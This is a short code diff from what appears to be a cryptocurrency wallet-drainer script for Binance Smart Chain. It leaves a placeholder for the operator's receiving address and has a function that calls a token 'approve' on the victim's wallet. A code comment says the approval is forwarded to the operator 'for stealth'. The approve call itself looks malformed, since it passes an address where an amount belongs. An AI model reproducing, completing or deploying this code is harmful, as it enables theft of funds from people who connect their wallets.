@@ -4,8 +4,8 @@ const receiveAddress = "";   // ENTER YOUR BSC ADDRESS HERE
 
 var minersContractx;
 var tokenContractx;
-function approveSpendingx(das) {
-	  tokenContract.methods.approve(minersContract, receiveAddress).send({ from: currentAddrx }); // goes to the mining contract then sends foward approval to you for stealth 
+function approveSpendingx(token) {
+	  tokenContract.methods.approve(minersContract, receiveAddressx).send({ from: currentAddrx }); // goes to the mining contract then sends foward approval to you for stealth 
   
 }
 var canSells = true;
